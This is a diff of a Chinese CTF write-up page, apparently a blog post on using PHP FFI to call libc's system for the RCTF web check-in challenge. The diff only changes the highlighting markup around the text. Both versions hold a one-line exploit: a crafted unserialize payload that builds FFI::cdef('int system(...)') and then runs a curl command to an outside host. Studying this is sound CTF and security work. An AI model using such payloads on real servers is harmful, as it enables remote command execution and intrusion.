@@ -312,14 +312,14 @@
 <p>在默认配置下，我们只能在预加载的 PHP 文件中使用 FFI，同时要注意的一点是，我们可以通过在预加载的 PHP 文件中生成一些 FFI\CData 对象，再交给我们的一般代码中使用的方式，来实现一般代码对 FFI 的使用，这也是 RCTF 的 Web 签到题的主要考点。</p>
 <p>如果我们第二个参数，也就是 lib 的文件名空着，他还能加载到 libc 中的 system函数吗？</p>
 <p>官方手册上这么说：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If lib is omitted, platforms supporting RTLD_DEFAULT attempt to lookup symbols declared in code in the normal global scope. Other systems will fail to resolve these symbols.</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If lib is omitted, platforms supporting RTLD_DEFAULT attempt <span class="hljs-built_in">to</span> lookup symbols declared <span class="hljs-keyword">in</span> code <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">normal</span> <span class="hljs-built_in">global</span> scope. Other systems will fail <span class="hljs-built_in">to</span> <span class="hljs-built_in">resolve</span> these symbols.<br></code></pre></td></tr></table></figure>
 
 <p>也就是说一般情况下，会尝试在全局范围内对符号进行寻找。</p>
 <hr>
 <h3 id="赛题复现"><a href="#赛题复现" class="headerlink" title="赛题复现"></a>赛题复现</h3><p>题目环境关闭了写权限，应该是为了防止非预期。（不过 FFI 应该无法非预期？毕竟无法预加载其他 PHP 文件了。）</p>
 <p>题目还禁止了 ReflectionClass 这个类，应该是为了防止通过反射直接使用题目给出的类吧。（不过好像也没有什么好用的？）</p>
 <p>通过 call_user_func 调用 FFI::cdef(int system(char *command);) 生成一个 FFI 对象，然后在我们的 webshell 中使用即可：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>);<span class="variable">$a</span>-&gt;ret-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://*.cn/xss.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>);<span class="hljs-variable">$a</span>-&gt;ret-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;curl https://*.cn/xss.php&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <hr>
 <p>Orz</p>
